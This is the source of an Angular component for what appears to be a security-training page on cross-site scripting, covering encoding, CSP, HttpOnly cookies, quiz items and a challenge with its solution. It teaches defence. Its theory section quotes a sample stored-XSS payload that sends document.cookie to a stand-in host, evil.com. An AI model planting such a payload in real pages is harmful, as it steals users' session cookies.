import { Component } from '@angular/core';
import { CommonModule } from '@angular/common';
import { PageMetaComponent } from '../../../shared/page-meta/page-meta';
import { QuickRefComponent, QuickRefItem } from '../../../shared/quick-ref/quick-ref';
import { TheoryBlockComponent, TheoryPoint } from '../../../shared/theory-block/theory-block';
import { CodeBlockComponent, CodeTab } from '../../../shared/code-block/code-block';
import { CommonMistakesComponent, CommonMistake } from '../../../shared/common-mistakes/common-mistakes';
import { ChallengeBlockComponent, Challenge } from '../../../shared/challenge-block/challenge-block';
import { QuizBlockComponent, QuizQuestion } from '../../../shared/quiz-block/quiz-block';
import { QnaBlockComponent, QnaItem } from '../../../shared/qna-block/qna-block';
import { RevisionCardComponent, RevisionSummary } from '../../../shared/revision-card/revision-card';
import { PageCompleteComponent } from '../../../shared/page-complete/page-complete';

const quickRef: QuickRefItem[] = [
  { name: 'XSS',          type: 'keyword', desc: 'Cross-Site Scripting — injecting malicious scripts into a page viewed by other users.' },
  { name: 'Stored XSS',   type: 'keyword', desc: 'Payload persisted in DB and rendered to every user who views the page.' },
  { name: 'Reflected XSS', type: 'keyword', desc: 'Payload echoed from URL/form input in the response — requires user to click a crafted link.' },
  { name: 'DOM XSS',      type: 'keyword', desc: 'Client-side code writes attacker-controlled data directly to the DOM without sanitization.' },
  { name: 'CSP',          type: 'keyword', desc: 'Content Security Policy — browser header that restricts script sources, preventing inline XSS.' },
  { name: 'innerText',    type: 'keyword', desc: 'Safe alternative to innerHTML — sets text content, not HTML; special characters are escaped.' },
];

const theory: TheoryPoint[] = [
  {
    heading: 'XSS Attack Types',
    points: [
      'Stored XSS: attacker submits `<script>document.location=\'https://evil.com/steal?\'+document.cookie</script>` as a comment. The server stores it and serves it to every user who views that page.',
      'Reflected XSS: attacker sends victim a link like `https://bank.com/search?q=<script>stealCookies()</script>`. The server includes the `q` value in the response HTML without escaping.',
      'DOM XSS: client-side JavaScript reads `location.hash` or `location.search` and writes it to `innerHTML` or `document.write` — the script runs in the victim\'s browser without hitting the server.',
      'Impact: cookie theft (session hijacking), keylogging, credential phishing overlays, cryptocurrency mining, redirecting users to malicious sites.',
    ],
  },
  {
    heading: 'Primary Defenses',
    points: [
      'Output encoding: HTML-encode all user-controlled data before inserting into HTML context. `&` → `&amp;`, `<` → `&lt;`, `>` → `&gt;`, `"` → `&quot;`. Context matters: HTML body, HTML attribute, JS string, and URL each require different encoding.',
      'Use safe APIs: `element.textContent = userInput` (safe) vs `element.innerHTML = userInput` (dangerous). React, Angular, and Vue escape by default — do not use `dangerouslySetInnerHTML` or `[innerHTML]` with user input.',
      'Content Security Policy (CSP): HTTP header `Content-Security-Policy: default-src \'self\'; script-src \'self\' \'nonce-abc123\'` — browsers refuse to execute inline scripts and scripts from unlisted sources.',
      'HttpOnly cookies: mark session cookies `HttpOnly` — JavaScript cannot read them even if XSS executes. Reduces impact of cookie theft.',
    ],
  },
  {
    heading: 'Content Security Policy (CSP)',
    points: [
      'CSP is the last line of defence — it limits XSS impact even when injection occurs. It does NOT prevent injection; it limits execution.',
      'Strict CSP: `Content-Security-Policy: default-src \'none\'; script-src \'self\' \'nonce-{random}\'; style-src \'self\' \'nonce-{random}\'; img-src \'self\' data:`. Generate a new nonce per request.',
      'Never use `unsafe-inline` — it negates CSP protection for scripts. If you need inline styles, use nonces.',
      'Report-only mode: `Content-Security-Policy-Report-Only` — enforces nothing but reports violations to a URL, allowing you to test a new policy without breaking the site.',
    ],
  },
  {
    heading: 'Framework-Specific Protections',
    points: [
      'Angular: template binding `{{ userInput }}` is safe — Angular escapes HTML. `[innerHTML]="userInput"` is dangerous — Angular does NOT sanitize it by default (it will strip scripts but not all XSS vectors). Use `DomSanitizer.sanitizeHtml()` if truly needed.',
      'React: JSX `{userInput}` is safe. `dangerouslySetInnerHTML={{ __html: userInput }}` is dangerous — use DOMPurify if you must render user HTML.',
      'Server-side rendering: escape output in templates. Handlebars `{{userInput}}` escapes; `{{{userInput}}}` does not. Same pattern in Jinja2, EJS, Razor.',
    ],
  },
];

const codeTabs: CodeTab[] = [
  {
    label: 'Output Encoding',
    language: 'typescript',
    code: `// ── Server-side HTML encoding (Node.js / Express) ───────────────────────────
function encodeHtml(str: string): string {
  return str
    .replace(/&/g,  '&amp;')
    .replace(/</g,  '&lt;')
    .replace(/>/g,  '&gt;')
    .replace(/"/g,  '&quot;')
    .replace(/'/g,  '&#x27;');
}

// ── Rendered in template ─────────────────────────────────────────────────────
// UNSAFE: res.send(\`<p>Hello \${req.query.name}</p>\`);
// SAFE:
res.send(\`<p>Hello \${encodeHtml(req.query.name as string)}</p>\`);

// ── Client-side DOM manipulation ─────────────────────────────────────────────
const userInput = '<img src=x onerror="alert(1)">';

// DANGEROUS:
document.getElementById('output')!.innerHTML = userInput;

// SAFE: textContent treats the string as text, not HTML
document.getElementById('output')!.textContent = userInput;

// ── When you MUST render HTML (e.g., rich text from CMS) use DOMPurify ───────
import DOMPurify from 'dompurify';
const sanitized = DOMPurify.sanitize(userHtml, {
  ALLOWED_TAGS:  ['b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'li'],
  ALLOWED_ATTR:  ['href', 'class'],
  ALLOW_DATA_ATTR: false,
});
document.getElementById('content')!.innerHTML = sanitized; // safe`,
  },
  {
    label: 'Content Security Policy (Express)',
    language: 'typescript',
    code: `import helmet from 'helmet';
import crypto from 'crypto';

// ── CSP with per-request nonce (helmet) ──────────────────────────────────────
app.use((req, res, next) => {
  // Generate a fresh nonce for every response
  res.locals['cspNonce'] = crypto.randomBytes(16).toString('base64');
  next();
});

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc:     ["'none'"],
    scriptSrc:      ["'self'", (req: any, res: any) => \`'nonce-\${res.locals['cspNonce']}'\`],
    styleSrc:       ["'self'", (req: any, res: any) => \`'nonce-\${res.locals['cspNonce']}'\`],
    imgSrc:         ["'self'", 'data:', 'https://cdn.example.com'],
    connectSrc:     ["'self'"],
    fontSrc:        ["'self'"],
    objectSrc:      ["'none'"],   // no Flash/plugins
    frameAncestors: ["'none'"],   // clickjacking protection
    baseUri:        ["'self'"],
    formAction:     ["'self'"],
    reportUri:      ['/api/csp-report'],
  },
}));

// ── Include nonce in rendered HTML ───────────────────────────────────────────
// In your template: <script nonce="<%= nonce %>">...</script>
// Express:
app.get('/', (req, res) => {
  res.render('index', { nonce: res.locals['cspNonce'] });
});

// ── Report-only mode for testing ─────────────────────────────────────────────
// app.use(helmet.contentSecurityPolicy({ directives: {...}, reportOnly: true }));

// ── CSP violation endpoint ───────────────────────────────────────────────────
app.post('/api/csp-report', express.json({ type: 'application/csp-report' }), (req, res) => {
  console.warn('CSP violation:', req.body);
  res.status(204).end();
});`,
  },
];

const mistakes: CommonMistake[] = [
  {
    title: 'Using innerHTML with user-controlled data',
    wrong: `element.innerHTML = userComment; // executes any <script> or onerror= in userComment`,
    right: `element.textContent = userComment; // treats as text, no HTML parsing
// Or if HTML is needed:
element.innerHTML = DOMPurify.sanitize(userComment);`,
    explanation: '`innerHTML` parses the string as HTML and executes any scripts or event handlers. `textContent` treats the string as literal text — special characters are automatically escaped. Always prefer `textContent`; use DOMPurify when you genuinely need to render HTML.',
  },
  {
    title: 'Using Angular [innerHTML] without sanitization',
    wrong: `<!-- Angular doesn't sanitize [innerHTML] against all XSS vectors -->
<div [innerHTML]="userContent"></div>`,
    right: `<!-- Option 1: display as text (safest) -->
<div>{{ userContent }}</div>
<!-- Option 2: sanitize first if HTML is needed -->
<div [innerHTML]="sanitizer.bypassSecurityTrustHtml(DOMPurify.sanitize(userContent))"></div>`,
    explanation: 'Angular\'s `[innerHTML]` does strip `<script>` tags but does not sanitize all XSS vectors (e.g., `<img onerror=...>`). Use `{{ }}` binding for text, or sanitize with DOMPurify before passing to `bypassSecurityTrustHtml`.',
  },
  {
    title: 'CSP with unsafe-inline — negates script protection',
    wrong: `Content-Security-Policy: script-src 'self' 'unsafe-inline'`,
    right: `Content-Security-Policy: script-src 'self' 'nonce-abc123'
<!-- Generate a fresh nonce per response, reference it on <script> tags -->`,
    explanation: '`unsafe-inline` allows any inline `<script>` tag and event handler attributes — it completely disables CSP script protection. Use nonces instead: a per-request random value that must appear on legitimate `<script>` tags.',
  },
  {
    title: 'Not setting HttpOnly on session cookies',
    wrong: `res.cookie('session', token); // accessible to JavaScript — XSS can steal it`,
    right: `res.cookie('session', token, { httpOnly: true, secure: true, sameSite: 'strict' });`,
    explanation: 'Without `HttpOnly`, JavaScript (including injected XSS scripts) can read the session cookie via `document.cookie`. `HttpOnly` makes the cookie invisible to JavaScript while still sending it in HTTP requests.',
  },
];

const challenge: Challenge = {
  title: 'HTML Encoder',
  language: 'typescript',
  description: `Implement encodeForHtml(input: string): string that safely encodes these 5 characters for HTML output:
- & → &amp;
- < → &lt;
- > → &gt;
- " → &quot;
- ' → &#x27;
This prevents XSS when inserting user input into HTML context.`,
  hints: [
    'Use String.replace() with a global regex for each character',
    'Replace & first (before replacing other chars with &-prefixed entities)',
  ],
  starterCode: `function encodeForHtml(input: string): string {
  // TODO
  return input;
}`,
  solution: `function encodeForHtml(input: string): string {
  return input
    .replace(/&/g,  '&amp;')   // must be first
    .replace(/</g,  '&lt;')
    .replace(/>/g,  '&gt;')
    .replace(/"/g,  '&quot;')
    .replace(/'/g,  '&#x27;');
}

console.log(encodeForHtml('<script>alert("xss")</script>'));
// &lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;

console.log(encodeForHtml('Alice & Bob\'s "special" <offer>'));
// Alice &amp; Bob&#x27;s &quot;special&quot; &lt;offer&gt;`,
};

const quiz: QuizQuestion[] = [
  {
    q: 'What is the safest way to insert user-supplied text into the DOM?',
    options: [
      'element.innerHTML with encodeURIComponent first',
      'element.textContent — treats the value as literal text, no HTML parsing',
      'document.write() with the encoded string',
      'element.outerHTML = sanitize(userInput)',
    ],
    answer: 1,
    explanation: '`element.textContent` sets the text content of a node — the browser never parses it as HTML, so `<script>` and `onerror=` attributes are treated as literal text. It is the safest way to insert user content into the DOM.',
  },
  {
    q: 'What does `Content-Security-Policy: script-src \'none\'` do?',
    options: [
      'Blocks all network requests',
      'Prevents any JavaScript from executing on the page — both inline and external',
      'Only blocks third-party scripts',
      'Removes all script tags from the HTML',
    ],
    answer: 1,
    explanation: '`script-src \'none\'` tells browsers to refuse to execute any JavaScript on the page — neither inline `<script>` tags, event handlers (`onclick=`), nor external scripts. Useful for pages that intentionally have no JavaScript (e.g., email templates, static error pages).',
  },
];

const qna: QnaItem[] = [
  {
    q: 'What is the difference between stored, reflected, and DOM-based XSS?',
    a: '<strong>Stored XSS</strong>: payload is persisted in the database and rendered to every user who views the page — most dangerous because no user interaction required after initial injection. <strong>Reflected XSS</strong>: payload is in a URL parameter; the server echoes it in the response HTML — attacker must trick the victim into clicking a crafted link. <strong>DOM XSS</strong>: client-side JavaScript reads attacker-controlled input (URL fragment, form field) and writes it to <code>innerHTML</code> or <code>document.write</code> — the server is never involved; purely browser-side.',
  },
  {
    q: 'Does Angular automatically protect against XSS?',
    a: 'Angular\'s template binding <code>{{ value }}</code> and property bindings like <code>[textContent]="value"</code> are safe — Angular escapes HTML. However, <code>[innerHTML]="value"</code> is dangerous: Angular does strip <code>&lt;script&gt;</code> tags but does NOT sanitize all XSS vectors. Never use <code>[innerHTML]</code> with untrusted user content without first passing it through DOMPurify. Angular\'s <code>bypassSecurityTrustHtml()</code> is explicitly for cases where you KNOW the HTML is safe — it bypasses all sanitization.',
  },
];

const revision: RevisionSummary = {
  oneLiner: 'XSS = injecting scripts into pages — defend with output encoding, textContent over innerHTML, CSP nonces, and HttpOnly cookies; DOMPurify when user HTML is required.',
  mustKnow: [
    'Stored: payload in DB, served to all users; Reflected: in URL, served back; DOM: client-side innerHTML',
    'Use textContent, not innerHTML — browser treats textContent as literal text',
    'HTML encode: & < > " \' before inserting user data into HTML',
    'CSP: script-src \'nonce-xxx\' restricts inline scripts — never unsafe-inline',
    'HttpOnly cookies: JavaScript (including XSS) cannot read them',
    'Angular {{ }} and React JSX {} are safe; [innerHTML] and dangerouslySetInnerHTML are not',
  ],
  interviewFocus: [
    'What is the difference between stored and reflected XSS?',
    'How does Content Security Policy reduce XSS impact?',
    'Why does HttpOnly on cookies help with XSS?',
  ],
};

@Component({
  selector: 'app-sec-xss',
  standalone: true,
  imports: [CommonModule, PageMetaComponent, QuickRefComponent, TheoryBlockComponent,
    CodeBlockComponent, CommonMistakesComponent, ChallengeBlockComponent,
    QuizBlockComponent, QnaBlockComponent, RevisionCardComponent, PageCompleteComponent],
  templateUrl: './xss.html',
  styleUrl: './xss.scss',
})
export class SecXss {
  quickRef = quickRef; theory = theory; codeTabs = codeTabs;
  mistakes = mistakes; challenge = challenge; quiz = quiz; qna = qna; revision = revision;
}
